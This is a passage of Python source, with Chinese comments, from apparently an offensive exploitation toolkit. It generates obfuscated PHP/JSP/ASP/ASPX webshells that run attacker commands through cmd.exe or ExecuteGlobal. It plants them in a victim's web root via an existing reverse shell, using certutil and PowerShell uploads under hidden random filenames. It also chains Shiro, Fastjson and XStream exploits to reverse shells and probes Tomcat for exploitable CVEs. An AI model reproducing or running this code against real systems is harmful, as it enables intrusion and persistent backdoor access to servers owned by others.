                    "InputStream is=pr.getInputStream();byte[] b=new byte[8192];int n;"
                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % epw)
        code = head + body
    elif lang == "aspx":
        # aspx 跑在 Windows / IIS 上 —— 用 cmd.exe /c 起进程并回显，**绝不能用 sh**
        epw, ek = esc(pw), esc(xk)
        head = "<%@ Page Language=\"C#\" %>\n"
        if encoding == "base64":
            dec = "    string cmd = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(p));\n"
        elif encoding == "xor":
            dec = ("    byte[] db = Convert.FromBase64String(p);\n"
                   "    byte[] kb = System.Text.Encoding.UTF8.GetBytes(\"%s\");\n"
                   "    byte[] cb = new byte[db.Length];\n"
                   "    for (int i = 0; i < db.Length; i++) { cb[i] = (byte)(db[i] ^ kb[i %% kb.Length]); }\n"
                   "    string cmd = System.Text.Encoding.UTF8.GetString(cb);\n" % ek)
        else:
            dec = "    string cmd = p;\n"
        # 这段是常量（不参与 % 格式化），所以 % 不用转义
        tail = (
            "    System.Diagnostics.ProcessStartInfo psi = "
            "new System.Diagnostics.ProcessStartInfo(\"cmd.exe\", \"/c \" + cmd);\n"
            "    psi.UseShellExecute = false;\n"
            "    psi.RedirectStandardOutput = true;\n"
            "    psi.RedirectStandardError = true;\n"
            "    System.Diagnostics.Process pr = System.Diagnostics.Process.Start(psi);\n"
            "    string o = pr.StandardOutput.ReadToEnd() + pr.StandardError.ReadToEnd();\n"
            "    pr.WaitForExit();\n"
            "    Response.Write(o);\n"
            "}\n"
            "%>")
        body = ("<%%\n"
                "string p = Request[\"%s\"];\n"
                "if (!string.IsNullOrEmpty(p))\n"
                "{\n" % epw) + dec
        code = head + body + tail
    else:  # asp：plain / base64 / xor 三种编码均真实生效（与 PHP/JSP 一致）
        # 与 PHP/JSP 共用同一把 xor 密钥，保证客户端编码逻辑一致
        epw, ek = esc_vbs(pw), esc_vbs(xk)
        ASP_XOR_KEY = ek
        # base64：用 MSXML 做 base64 解码得到原始 VBScript 字节流，再 ExecuteGlobal
        asp_b64 = (
            "<%%\r\n"
            "Function DK_B64(b64)\r\n"
            "  Set o=CreateObject(\"MSXML2.DOMDocument.3.0\")\r\n"
            "  Set e=o.createElement(\"b64\")\r\n"
            "  e.dataType=\"bin.base64\"\r\n"
            "  e.text=b64\r\n"
            "  DK_B64=e.nodeTypedValue\r\n"
            "End Function\r\n"
            "Function DK_S(b)\r\n"
            "  Dim t,i\r\n"
            "  t=\"\"\r\n"
            "  For i=0 To UBound(b)\r\n"
            "    t=t&Chr(b(i))\r\n"
            "  Next\r\n"
            "  DK_S=t\r\n"
            "End Function\r\n"
            "Dim dk_v\r\n"
            "dk_v=Request(\"%s\")\r\n"
            "If dk_v<>\"\" Then ExecuteGlobal(DK_S(DK_B64(dk_v)))\r\n"
            "%%>"
        )
        # xor：先 base64 解码，再按密钥逐字节循环异或还原，再 ExecuteGlobal
        asp_xor = (
            "<%%\r\n"
            "Function DK_B64(b64)\r\n"
            "  Set o=CreateObject(\"MSXML2.DOMDocument.3.0\")\r\n"
            "  Set e=o.createElement(\"b64\")\r\n"
            "  e.dataType=\"bin.base64\"\r\n"
            "  e.text=b64\r\n"
            "  DK_B64=e.nodeTypedValue\r\n"
            "End Function\r\n"
            "Function DK_X(b,k)\r\n"
            "  Dim i,c\r\n"
            "  For i=0 To UBound(b)\r\n"
            "    c=Asc(Mid(k,(i Mod Len(k))+1,1))\r\n"
            "    b(i)=b(i) Xor c\r\n"
            "  Next\r\n"
            "  DK_X=b\r\n"
            "End Function\r\n"
            "Function DK_S(b)\r\n"
            "  Dim t,i\r\n"
            "  t=\"\"\r\n"
            "  For i=0 To UBound(b)\r\n"
            "    t=t&Chr(b(i))\r\n"
            "  Next\r\n"
            "  DK_S=t\r\n"
            "End Function\r\n"
            "Dim dk_v\r\n"
            "dk_v=Request(\"%s\")\r\n"
            "If dk_v<>\"\" Then ExecuteGlobal(DK_S(DK_X(DK_B64(dk_v),\"%s\")))\r\n"
            "%%>"
        )
        if encoding == "base64":
            code = asp_b64 % epw
        elif encoding == "xor":
            code = asp_xor % (epw, ASP_XOR_KEY)
        else:
            code = "<%% If Request(\"%s\")<>\"\" Then ExecuteGlobal(Request(\"%s\")) End If %%>" % (epw, epw)
    return code, ext


# ---- 跨平台 web 根候选（Windows 分支绝不能出现 find / 、sh -c 、ls）----
_LINUX_WEBROOTS = [
    "/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/www", "/data/www",
    "/usr/local/tomcat/webapps/ROOT", "/opt/tomcat/webapps/ROOT",
    "/usr/share/tomcat/webapps/ROOT", "/usr/share/tomcat9/webapps/ROOT",
    "/var/lib/tomcat9/webapps/ROOT", "/var/lib/tomcat8/webapps/ROOT",
    "/opt/app", "/app", "/www", "/home/wwwroot/default",
]
_WIN_WEBROOTS = [
    "C:\\inetpub\\wwwroot", "C:\\xampp\\htdocs", "C:\\wamp\\www", "C:\\wamp64\\www",
    "C:\\apache\\htdocs", "C:\\nginx\\html", "C:\\tomcat\\webapps\\ROOT",
    "C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT",
    "C:\\Program Files\\Apache Software Foundation\\Tomcat 8.5\\webapps\\ROOT",
    "C:\\Program Files\\Apache Software Foundation\\Tomcat 10.0\\webapps\\ROOT",
]


def _win_webroot_probe():
    """Windows web 根探测命令：单条 cmd 命令，for + %~i 去掉引号，不需要 & 串联。

    变量名必须用 i 这类「非修饰符字母」：d/p/n/x/f/s/t/z/a 在 %~ 后面是路径修饰符，
    写成 for %d ... %~d 时 cmd 会按修饰符解析（实测 cmd /c *.bat 下直接报
    「批处理参数替换中的路径运算符的下列用法无效」），只有交互式 cmd 侥幸能跑通。
    """
    items = " ".join('"%s"' % r for r in _WIN_WEBROOTS)
    return 'for %i in (' + items + ') do @if exist "%~i\\." echo DK_ROOT:%~i'


def _detect_shell_os(sid, timeout=6):
    """经反弹 shell 判断目标 OS，返回 'linux' / 'windows' / ''（判不出来）。"""
    out, _ = _shell_run(sid, "uname -s", timeout=timeout)
    o = (out or "").lower()
    if "linux" in o:
        return "linux"
    # Windows 上的 Git-Bash / Cygwin / MSYS 也走 uname：MINGW64_NT-10.0 / CYGWIN_NT-10.0
    if "mingw" in o or "cygwin" in o or "msys" in o or "_nt-" in o:
        return "windows"
    out2, _ = _shell_run(sid, "ver", timeout=timeout)
    if "windows" in (out2 or "").lower():
        return "windows"
    out3, _ = _shell_run(sid, "echo %OS%", timeout=timeout)
    if "windows" in (out3 or "").lower():
        return "windows"
    return "linux" if o else ""      # 有 uname 输出但没匹配上 → 按 Linux 处理（旧行为）


def _size_from_output(text):
    """从落地校验命令的输出里解析文件大小；解析不出来返回 -1。"""
    if not text:
        return -1
    for ln in text.splitlines():
        ln = ln.strip()
        if ln.startswith("DK_SIZE:"):
            try:
                return int(ln[8:].strip())
            except Exception:
                return -1
    for ln in text.splitlines():
        ln = ln.strip()
        if not ln:
            continue
        first = ln.split()[0]
        if first.isdigit():
            return int(first)
    return -1


def _win_file_size(sid, remote):
    """Windows 侧取文件大小（cmd for 的 %~zf），取不到返回 -1。"""
    # 注意 %%f / %%~zf：这两个 % 都要转义，否则会被当成 %f(浮点) 格式符
    out, _ = _shell_run(sid, 'for %%f in ("%s") do @echo DK_SIZE:%%~zf' % remote,
                        timeout=8, sep="&")
    return _size_from_output(out)


def _upload_bytes_windows(sid, data, remote, timeout=30):
    """Windows 目标落地文件：分块 echo 写 base64 → certutil -decode → PowerShell 兜底。

    目标上既没有 curl 也没有 wget 时（Windows 很常见）走这条。全程只用 cmd /
    PowerShell 内建能力，绝不下发 base64 -d 、/tmp/... 这类 Linux 命令。
    """
    b = base64.b64encode(data).decode()
    tmp = "%%TEMP%%\\.dk_up_%s.b64" % os.urandom(4).hex()
    notes = []
    chunk = 512                      # 避开 cmd 命令行长度上限
    n = 0
    while n < len(b):
        # base64 字符集里没有 cmd 元字符，可以直接 echo 追加
        _, e = _shell_run(sid, "echo %s>>%s" % (b[n:n + chunk], tmp), timeout=8, sep="&")
        if e:
            return {"ok": False, "output": "Windows 分块写入中断: %s" % e,
                    "detail": "\n".join(notes)}
        n += chunk
    _shell_run(sid, "certutil -decode %s %s" % (tmp, remote),
               timeout=max(10.0, float(timeout)), sep="&")
    sz = _win_file_size(sid, remote)
    if sz != len(data):
        notes.append("certutil -decode 未得到预期大小（%s 字节），改用 PowerShell 兜底"
                     % (sz if sz >= 0 else "未知"))
        _shell_run(sid,
                   "powershell -nop -c \"[IO.File]::WriteAllBytes('%s',"
                   "[Convert]::FromBase64String([IO.File]::ReadAllText('%s')))\""
                   % (remote, tmp), timeout=max(15.0, float(timeout)), sep="&")
        sz = _win_file_size(sid, remote)
    _shell_run(sid, "del /f /q %s" % tmp, timeout=6, sep="&")
    if sz == len(data):
        notes.append("方式=Windows(certutil/PowerShell 解码 base64)，%d 块"
                     % ((len(b) + chunk - 1) // chunk))
        return {"ok": True, "output": "上传成功: %s (%d 字节)" % (remote, len(data)),
                "detail": "\n".join(notes)}
    return {"ok": False,
            "output": "上传校验失败: 期望 %d 字节，实际 %s 字节（certutil 与 PowerShell 都没成功）"
                      % (len(data), sz if sz >= 0 else "未知"),
            "detail": "\n".join(notes)}


def ex_webshell_drop(target, p):
    """拿到 shell 后，向目标 web 根写入一句话木马（功能 C）。

    参数: sid(必填), lang(php/jsp/asp/aspx), password(连接密码), key(xor密钥, 默认 dkx0r),
          encoding(base64/xor/plain), webroot(可选, 留空则按目标 OS 自动探测),
          context(可选, URL上下文路径, 留空则从 webapps/<app> 自动推断),
          filename(可选), lhost/port(可选, 上传加速用), timeout(可选)。
    ★ 只落地文件并报告 路径 / 口令 / xor密钥 / 访问地址，不自动执行任何破坏动作。
    """
    sid = (p.get("sid") or "").strip()
    if not sid:
        return {"ok": False, "output": "缺少 sid（先通过 Shiro / XStream shell 模式上线）"}
    if not STATE["sessions"].get(sid):
        return {"ok": False, "output": "会话不存在（先用 Shiro / XStream 的 shell 模式把目标打上线）"}
    lang = (p.get("lang") or "php").strip().lower()
    if lang not in ("php", "jsp", "asp", "aspx"):
        return {"ok": False, "output": "lang 仅支持 php / jsp / asp / aspx"}
    pw = (p.get("password") or "dk").strip() or "dk"
    xk = (p.get("key") or "").strip() or "dkx0r"
    enc = (p.get("encoding") or "plain").strip().lower()
    to = float(p.get("timeout") or 20)

    code, ext = _gen_webshell(lang, pw, enc, key=xk)
    data = code.encode("utf-8")

    notes = []
    # ① 先判目标 OS —— 后面探测命令、路径分隔符、上传方式全都依赖它
    os_kind = _detect_shell_os(sid)
    win = (os_kind == "windows")
    sep = "&" if win else ";"          # cmd.exe 用 & 串联，bash 用 ;
    notes.append("目标 OS 判定: %s" % (os_kind or "未判出（按 Linux 处理）"))

    # ② 探测 web 根（跨平台：Windows 走 if exist/dir，绝不出现 find / 、sh -c 、ls）
    webroot = (p.get("webroot") or "").strip()
    found_roots = []
    if webroot:
        found_roots = [webroot]
    elif win:
        out, _ = _shell_run(sid, _win_webroot_probe(), timeout=10, sep=sep)
        for line in (out or "").splitlines():
            line = line.strip()
            if line.startswith("DK_ROOT:"):
                found_roots.append(line[8:].strip())
    else:
        probe = ("for d in %s; do [ -d \"$d\" ] && echo \"DK_ROOT:$d\"; done"
                 % " ".join(_LINUX_WEBROOTS))
        out, _ = _shell_run(sid, probe, timeout=9)
        for line in (out or "").splitlines():
            line = line.strip()
            if line.startswith("DK_ROOT:"):
                found_roots.append(line[8:])
        if not found_roots:
            # 候选都没命中 → 从进程命令行推断 tomcat 家目录（比 find / 快且不惊动目标）
            psout, _ = _shell_run(
                sid,
                "ps -eo args 2>/dev/null | grep -oE '(catalina\\.home|catalina\\.base)=[^ ]+' | head -5",
                timeout=10)
            extra = []
            for ln in (psout or "").splitlines():
                if "=" in ln:
                    v = ln.split("=", 1)[1].strip()
                    if v:
                        extra.append(v + "/webapps/ROOT")
            if extra:
                out2, _ = _shell_run(
                    sid,
                    "for d in %s; do [ -d \"$d\" ] && echo \"DK_ROOT:$d\"; done" % " ".join(extra),
                    timeout=8)
                for line in (out2 or "").splitlines():
                    line = line.strip()
                    if line.startswith("DK_ROOT:"):
                        found_roots.append(line[8:])
    if not found_roots:
        cands = _WIN_WEBROOTS if win else _LINUX_WEBROOTS
        return {"ok": False,
                "output": "未探测到常见 web 根目录；请用 webroot 参数手动指定",
                "detail": "目标 OS: %s\n探测过:\n%s" % (os_kind or "未知",
                                                        "\n".join(cands))}

    root = found_roots[0]
    fname = (p.get("filename") or "").strip() or (".dk_%s%s" % (os.urandom(4).hex(), ext))
    if win:
        remote = root.rstrip("\\/") + "\\" + fname.lstrip("/\\")
    else:
        remote = "%s/%s" % (root.rstrip("/"), fname.lstrip("/"))

    # ③ 落地
    up = _upload_bytes(sid, data, remote, target, p, notes)
    if not up.get("ok"):
        up["detail"] = ("目标 OS: %s\nweb 根探测到: %s\n" % (os_kind or "未知", root)) \
                       + (up.get("detail") or "")
        up["webroot"] = root
        return up

    # ④ 落地后确认：目标侧文件大小必须等于 len(data)，不一致就直接报失败
    if win:
        vout, _ = _shell_run(sid, 'for %%f in ("%s") do @echo DK_SIZE:%%~zf' % remote,
                             timeout=8, sep=sep)
    else:
        vout, _ = _shell_run(
            sid, "stat -c %%s %s 2>/dev/null || wc -c < %s 2>/dev/null || echo DK_NOFILE"
                 % (remote, remote), timeout=8)
    got = _size_from_output(vout)
    if got != len(data):
        return {"ok": False,
                "output": "落地校验失败: 期望 %d 字节，目标实际 %s 字节"
                          % (len(data), got if got >= 0 else "未知"),
                "webroot": root,
                "detail": ("目标 OS: %s\n落地路径: %s\nweb 根: %s\n"
                           "校验命令输出: %s\n%s"
                           % (os_kind or "未知", remote, root,
                              (vout or "(空)").strip()[:400], "\n".join(notes)))}

    # ⑤ URL：context 用户手填优先，否则从 .../webapps/<app> 自动推断
    ctx = (p.get("context") or "").strip().strip("/")
    if not ctx:
        m = re.search(r"/webapps/([^/]+)$", root.replace("\\", "/").rstrip("/"))
        if m:
            app = m.group(1)
            ctx = "" if app.upper() == "ROOT" else app
    urls = []
    root_url = ""
    try:
        root_url = get_root(normalize(target))
    except Exception:
        root_url = ""
    if root_url:
        urls.append("%s%s/%s" % (root_url, ("/" + ctx) if ctx else "", fname))
        if ctx:
            urls.append("%s/%s" % (root_url, fname))
    primary = urls[0] if urls else ""
    notes.append("落地校验: 目标侧 %d 字节，与本地一致" % got)

    return {
        "ok": True,
        "output": "一句话木马已落地【POST/GET 参数名(口令)=%s，xor密钥=%s，加密=%s】访问地址=%s"
                  % (pw, xk, enc, primary or "(未知，见 detail)"),
        "remote": remote,
        "webroot": root,
        "url": primary,
        "urls": urls,
        "encoding": enc,
        "password": pw,
        "key": xk,
        "os": os_kind,
        "lang": lang,
        "detail": ("落地路径  : %s\n"
                   "目标 OS   : %s\n"
                   "web 根    : %s\n"
                   "主访问地址: %s\n"
                   "候选地址  : %s\n"
                   "★ 连接参数：参数名(口令) = %s ，加密方式 = %s ，xor 密钥 = %s\n"
                   "★ 仅落地文件，未执行任何破坏动作；用对应客户端按上面的口令连接即可。\n"
                   "★ 若地址不准，多半是上下文路径问题，可手动拼 %s/<上下文>/%s\n%s"
                   % (remote, os_kind or "未知", root,
                      primary or "(无法推测)", "\n".join(urls) or "(无)",
                      pw, enc, xk, root_url or "http://目标", fname,
                      "\n" + "\n".join(notes))),
    }


def _auto_detect(target, p):
    """功能 A 第 1 步：安全非破坏地探测 4 类漏洞，返回结构化结果。

    四类探测（SpringBoot / Shiro / Fastjson / XStream）各跑在独立线程中，主线程
    join(detect_timeout) 后收集已完成的成果；超时的探测项标记为「超时/跳过」并继续
    返回其余结构化结果。整体墙钟时间被 detect_timeout（默认 45s）限制，无论目标多慢
    都不会挂死，且不会 500。各子探测仍保留原有单次超时（timeout 参数）。
    """
    to = int(p.get("timeout", 8))
    detect_timeout = float(p.get("detect_timeout", 45))
    res = {"springboot": {}, "shiro": {}, "fastjson": {}, "xstream": {}}
    lock = threading.Lock()

    def _probe_springboot():
        sb = {"actuator": "", "env_readable": False, "flags": [],
              "sensitive_count": 0, "shiro_keys": []}
        try:
            act = ex_springboot_actuator(target, {"timeout": to})
            env = ex_springboot_env(target, {"timeout": to})
            sb["actuator"] = act.get("output", "")
            sb["env_readable"] = bool(env.get("ok"))
            sb["flags"] = env.get("flags", [])
            detail = env.get("detail", "")
            for mt in re.finditer(r"疑似 Shiro 密钥：(\S+?)\s*=\s*(\S+)", detail):
                sb["shiro_keys"].append(mt.group(2))
            m = re.search(r"敏感项（(\d+)", detail)
            if m:
                sb["sensitive_count"] = int(m.group(1))
        except Exception as e:
            sb["error"] = str(e)
        with lock:
            res["springboot"] = sb

    def _probe_shiro():
        sh = {}
        try:
            dummy = _shiro_cookie("kPH+bIxk5D2deZiIxcaaaA==", b"\xac\xed\x00\x05junk", "cbc")
            r = http(normalize(target) + "/", headers={"Cookie": "rememberMe=%s" % dummy},
                     timeout=to)
            sc = r["headers"].get("set-cookie", "")
            sh["present"] = "rememberMe=deleteMe" in sc
            sh["set_cookie"] = sc[:200]
        except Exception as e:
            sh["error"] = str(e)
        with lock:
            res["shiro"] = sh

    def _probe_fastjson():
        fj = {}
        try:
            r = ex_fastjson_probe(target, {"timeout": to})
            fj["output"] = r.get("output", "")
            fj["detail"] = (r.get("detail") or "")[:600]
        except Exception as e:
            fj["error"] = str(e)
        with lock:
            res["fastjson"] = fj

    def _probe_xstream():
        xs = {}
        try:
            r = ex_xstream_probe(target, {"timeout": to})
            xs["output"] = r.get("output", "")
            xs["detail"] = (r.get("detail") or "")[:600]
        except Exception as e:
            xs["error"] = str(e)
        with lock:
            res["xstream"] = xs

    threads = [
        threading.Thread(target=_probe_springboot, name="dk-sb", daemon=True),
        threading.Thread(target=_probe_shiro, name="dk-shiro", daemon=True),
        threading.Thread(target=_probe_fastjson, name="dk-fj", daemon=True),
        threading.Thread(target=_probe_xstream, name="dk-xs", daemon=True),
    ]
    deadline = time.time() + detect_timeout
    for t in threads:
        t.start()
    for t in threads:
        remain = max(0.0, deadline - time.time())
        t.join(remain)
    # 未完成的探测项（被 detect_timeout 截断）标记为超时，保证结构化返回不崩溃
    for name, t in zip(("springboot", "shiro", "fastjson", "xstream"), threads):
        if t.is_alive():
            with lock:
                res[name] = {"error": "探测超时（已跳过；全局 detect 截止 %.0fs）" % detect_timeout,
                             "timeout": True}
    # SpringBoot 泄露的 Shiro Key 反填到 shiro 探测项（各子探测并行，统一在 join 后汇总）
    if (res["springboot"].get("shiro_keys")
            and isinstance(res.get("shiro"), dict) and "present" in res["shiro"]):
        res["shiro"]["leaked_key"] = res["springboot"]["shiro_keys"][0]

    # 快照，避免后台线程（已置 daemon）后续写入影响已返回的响应结构
    detect = {k: (dict(v) if isinstance(v, dict) else v) for k, v in res.items()}

    found = []
    if detect["springboot"].get("env_readable"):
        found.append("SpringBoot env 可读(敏感项 %d，flag %d)"
                     % (detect["springboot"].get("sensitive_count", 0),
                        len(detect["springboot"].get("flags", []))))
    if detect["shiro"].get("present"):
        found.append("Shiro 存在%s" % ("(env 已泄露 Key)" if detect["shiro"].get("leaked_key") else ""))
    fj_out = detect["fastjson"].get("output", "")
    if "存在" in fj_out or "✅" in fj_out:
        found.append("Fastjson 疑似存在")
    xs_out = detect["xstream"].get("output", "")
    if "疑似" in xs_out or "确认" in xs_out:
        found.append("XStream 疑似存在")
    out = "探测完成。命中: " + ("；".join(found) if found else "无（或需人工复核各项 detail）")
    return {
        "ok": True,
        "output": out,
        "detect": detect,
        "detail": ("探测均为安全非破坏性（4 类并行，整体截止 %.0fs）：\n"
                   "· SpringBoot: GET /actuator、/env（读 env，可能泄露 shiro key / 敏感信息）\n"
                   "· Shiro: 用 dummy key 发 rememberMe，按 deleteMe 判断是否存在（未爆破）\n"
                   "· Fastjson / XStream: 发安全探测载荷，靠报错特征识别（未真正利用）\n\n"
                   % detect_timeout
                   + json.dumps(detect, ensure_ascii=False, indent=2)),
    }


def _auto_exploit(target, p):
    """功能 A 第 2 步：半自动利用。必须 confirm=1 才开火；每个 item 是独立显式动作。"""
    item = (p.get("item") or "").strip().lower()
    confirm = str(p.get("confirm", "")).strip().lower() in ("1", "yes", "true", "on")
    if not confirm:
        return {"ok": False,
                "output": "未确认：请显式把 confirm 设为 1 才会执行利用（半自动，绝不自动开火）"}
    lhost = ((p.get("lhost") or "").strip() or src_ip_for(target)
             or (local_ips() or ["127.0.0.1"])[0])
    lport = int(p.get("lport") or 4444)
    to = int(p.get("timeout", 12))
    if item == "shiro":
        key = (p.get("key") or "").strip()
        if not key:
            return {"ok": False,
                    "output": "请填写 key（来自上方探测的 leaked_key，或手动指定）"}
        return ex_shiro_exploit(target, {"key": key, "mode": "shell",
                                         "gadget": "CommonsBeanutils1",
                                         "lhost": lhost, "lport": lport, "send": "1",
                                         "timeout": to})
    if item == "fastjson":
        return ex_fastjson_183(target, {"mode": "shell", "lhost": lhost, "lport": lport,
                                        "http_port": int(p.get("http_port", 8000)),
                                        "timeout": to})
    if item == "xstream":
        return ex_xstream_cmd(target, {"cve": "CVE-2021-21351", "mode": "shell",
                                       "lhost": lhost, "lport": lport,
                                       "path": p.get("path") or "/", "timeout": to})
    if item == "springboot":
        # SpringBoot env 本身是信息类；这里只是再读一次并回显（无 shell）
        return ex_springboot_env(target, {"timeout": to})
    return {"ok": False,
            "output": "未知 item: %s（支持 shiro / fastjson / xstream / springboot）" % item}


def ex_auto_chain(target, p):
    """全类型自动识别 + 半自动串联（功能 A）。

    半自动、默认安全，绝不自动开火利用：
      phase=detect（默认）：全自动、无确认、安全非破坏地探测 SpringBoot / Shiro /
          Fastjson / XStream 四类漏洞，返回结构化结果（含泄露的 shiro key）。
      phase=exploit：需 confirm=1 才执行；item 指定 shiro/fastjson/xstream/springboot，
          调用已有利用函数，对 shell 类自动 listener_start + 反弹 bash 载荷。
          每个 item 是 UI 上独立的「执行 / 确认」动作。
    """
    phase = (p.get("phase") or "detect").strip().lower()
    if phase == "exploit":
        return _auto_exploit(target, p)
    return _auto_detect(target, p)


# ============================================================
# Tomcat 系列（第一批 3 个模块）
#   1. tomcat.probe      信息收集探测（只读）
#   2. tomcat.tribes_rce CVE-2026-34486  Tribes EncryptInterceptor fail-open
#   3. tomcat.session_put CVE-2025-24813 partial PUT 写 session
# ============================================================

_TOMCAT_VER_RE = re.compile(r"Apache\s+Tomcat/([0-9]+\.[0-9]+\.[0-9]+)", re.I)
_TOMCAT_VER_LOOSE_RE = re.compile(r"\b(\d+\.\d+\.\d+(?:\.\d+)?)\b")

# CVE-2026-34486 命中版本（Tribes 解密失败 fail-open，官方公告的三个分支起始版本）
_TRIBES_RCE_EXACT = {"9.0.116", "10.1.53", "11.0.20"}
# CVE-2025-24813 的候选上界：<= 这些版本仍未修（partial PUT 写 session）
_SESSION_PUT_MAX = {"9": (9, 0, 98), "10": (10, 1, 34), "11": (11, 0, 2)}


def _ver_tuple(v):
    """'9.0.116' → (9,0,116)；解析不了返回 None。"""
    try:
        parts = tuple(int(x) for x in (v or "").split(".") if x.isdigit())
        if len(parts) >= 2:
            return parts
    except Exception:
        pass
    return None


def _tcp_open(host, port, timeout=3, legacy=False):
    """纯 TCP 连通性探测。返回 (是否连通, 说明)。

    连不上时会区分：超时/refused（端口真关着）还是路由不可达，提示信息不同。
    """
    try:
        s = socket.create_connection((host, int(port)), timeout=float(timeout))
        s.close()
        return True, "TCP %s:%s 可连通" % (host, port)
    except Exception as e:
        k = type(e).__name__
        msg = str(e)
        if isinstance(e, ConnectionRefusedError):
            return False, "连接被拒绝（端口未开放或被防火墙 RESET）"
        if isinstance(e, socket.timeout) or "timed out" in msg:
            return False, "连接超时 %ss（端口被丢弃 / 被防火墙拦截）" % timeout
        return False, "%s: %s" % (k, msg)


def _tomcat_version(base, to):
    """多路径猜也可以 unambiguous：返回 (版本串, 证据行 list)。

    顺序：Server 响应头 → RELEASE-NOTES → 触发错误页（404/500）。
    每一项独立 try，某项炸了不影响后面的项。
    """
    evid = []
    # ① Server 响应头
    try:
        r = http(base + "/", timeout=to)
        sv = r["headers"].get("server", "")
        if sv:
            evid.append("GET / → Server: %s" % sv)
            m = _TOMCAT_VER_RE.search(sv)
            if m:
                return m.group(1), evid
    except Exception as e:
        evid.append("GET / 失败: %s" % e)
    # ② RELEASE-NOTES 泄露点（部分镜像没删）
    for ep in ("/RELEASE-NOTES.txt", "/docs/RELEASE-NOTES.txt",
               "/docs/architecture/index.html"):
        try:
            r = http(base + ep, timeout=to)
            if r["status"] == 200 and r["body"]:
                head = r["body"][:400].replace("\r", "")
                m = _TOMCAT_VER_RE.search(head)
                if m:
                    evid.append("GET %s → %s" % (ep, m.group(0)))
                    return m.group(1), evid
                m2 = _TOMCAT_VER_LOOSE_RE.search(head)
                if m2:
                    evid.append("GET %s → 疑似 %s" % (ep, m2.group(1)))
        except Exception as e:
            evid.append("GET %s 失败: %s" % (ep, e))
    # ③ 触发错误页找版本串（Tomcat 默认错误页会带 Apache Tomcat/9.0.x）
    for ep in ("/__dk_not_exist__", "/%2e%2e%2f", "/index.jsp;/'\"%3E"):
        try:
            r = http(base + ep, timeout=to, allow_redirect=False)
            blob = "\n".join([r["body"][:3000],
                              r["headers"].get("server", "")])
            m = _TOMCAT_VER_RE.search(blob)
            if m:
                evid.append("错误页 %s → HTTP %s → %s" % (ep, r["status"], m.group(0)))
                return m.group(1), evid
            if r["status"] >= 400:
                evid.append("错误页 %s → HTTP %s（未泄露版本串）" % (ep, r["status"]))
        except Exception as e:
            evid.append("错误页 %s 失败: %s" % (ep, e))
    return "", evid


def _tomcat_cves(ver):
    """按版本号给出 CVE 候选提示 + 该用哪个模块。返回 cves 列表。"""
    cves = []
    if not ver:
        return cves
    t = _ver_tuple(ver)
    if not t:
        return cves
    major = str(t[0])
    if ver in _TRIBES_RCE_EXACT:
        cves.append("CVE-2026-34486（Tribes EncryptInterceptor 解密失败仍旧放行，"
                    "无需集群密钥即可 RCE）—— 版本精确命中，建议下一步 tomcat.tribes_rce")
    up = _SESSION_PUT_MAX.get(major)
    if up and t <= up:
        cves.append("CVE-2025-24813 候选（partial PUT 写 session + 反序列化；"
                    "需 DefaultServlet readonly=false 且配了 PersistentManager+FileStore）"
                    "—— 建议先跑 tomcat.session_put，它会自己验可写性")
    if not cves:
        cves.append("未匹配本工具内置的 Tomcat CVE 规则（不代表安全，只是版本不在已知范围）")
    return cves


def ex_tomcat_probe(target, p):
    """Tomcat 信息收集 / 探测：只读、不触发任何利用动作。

    五项独立探测（版本 / Manager / Tribes 4000 / AJP 8009 / CVE 提示），
    任何一项失败都只记录原因，不影响其他项。
    """
    base = normalize(target)
    if not base:
        return {"ok": False, "output": "target 为空", "detail": ""}
    to = int(p.get("timeout", 8) or 8)
    host = urllib.parse.urlparse(base).hostname or base.split("//")[-1].split(":")[0]
    tport = int(p.get("tribes_port", 4000) or 4000)
    aport = int(p.get("ajp_port", 8009) or 8009)

    lines, notes = [], []

    # ① 版本
    ver, evid = _tomcat_version(base, to)
    lines.append("【版本】 %s" % (ver or "未识别"))
    lines += ["         %s" % e for e in evid[:8]]

    # ② Manager
    mgr = "unknown"
    try:
        r = http(base + "/manager/html", timeout=to, allow_redirect=False)
        sc = r["status"]
        # status=0 = urllib 连都没连上（异常塞在 r["err"]）；必须最先判，
        # 否则 0 会掉进下面的兜底分支被当成「HTTP 0」。
        if sc == 0:
            mgr = "不可达"
            lines.append("【Manager】 连不上: %s" % (r["err"] or "连接失败"))
        elif sc == 401:
            mgr = "存在(需认证)"
            lines.append("【Manager】 HTTP %s → 存在，需 Basic 认证（可尝试 tomcat.weak）" % sc)
        elif sc == 200:
            mgr = "未授权可访问"
            lines.append("【Manager】 HTTP %s → ★★ 未授权可访问！war 部署即 RCE（高危）" % sc)
        elif sc == 403:
            mgr = "被拒绝(403)"
            lines.append("【Manager】 HTTP 403 → 存在但拒绝当前来源（多半配了 RemoteAddrValve）")
        elif sc == 404:
            mgr = "不存在"
            lines.append("【Manager】 HTTP 404 → /manager 未安装")
        else:
            mgr = "HTTP %s" % sc
            lines.append("【Manager】 HTTP %s" % sc)
    except Exception as e:
        mgr = "探测失败"
        lines.append("【Manager】 探测失败: %s: %s" % (type(e).__name__, e))

    # ③④ Tribes / AJP 端口
    tribes_open, tmsg = _tcp_open(host, tport, timeout=min(to, 3))
    lines.append("【Tribes】 %s:%d → %s" % (host, tport, "开放" if tribes_open else "未开放"))
    lines.append("           %s" % tmsg)
    ajp_open, amsg = _tcp_open(host, aport, timeout=min(to, 3))
    lines.append("【AJP】    %s:%d → %s" % (host, aport, "开放" if ajp_open else "未开放"))
    lines.append("           %s" % amsg)

    # ⑤ CVE 提示
    cves = _tomcat_cves(ver)
    lines.append("【CVE 提示】")
    lines += ["           - %s" % c for c in cves] if cves else \
             ["           无（版本未知，无法按 CVE 规则匹配）"]

    # 下一步建议
    if tribes_open and any("CVE-2026-34486" in c for c in cves):
        next_step = "tomcat.tribes_rce（4000 可达且版本命中 → 强烈建议先跑 mode=check 的 URLDNS 检测）"
    elif ajp_open:
        next_step = "AJP 8009 开放 → 可关注 Ghostcat(CVE-2020-1938)，本工具第二批再做；" \
                    "本批可先用 tomcat.tribes_rce / tomcat.session_put"
    elif ver:
        next_step = "tomcat.session_put（先验证 partial PUT 可写性）"
    else:
        next_step = "换 target/端口确认 Tomcat 是否真的在线（可能是反代或改了端口）"
    lines.append("")
    lines.append("【下一步建议模块】 %s" % next_step)
    if tribes_open:
        notes.append("Tribes 端口开放 —— CVE-2026-34486 的前置条件之一满足，"
                     "另一个前置是目标 classpath 里有可用 gadget（用 tomcat.tribes_rce 的 check 模式验证）")
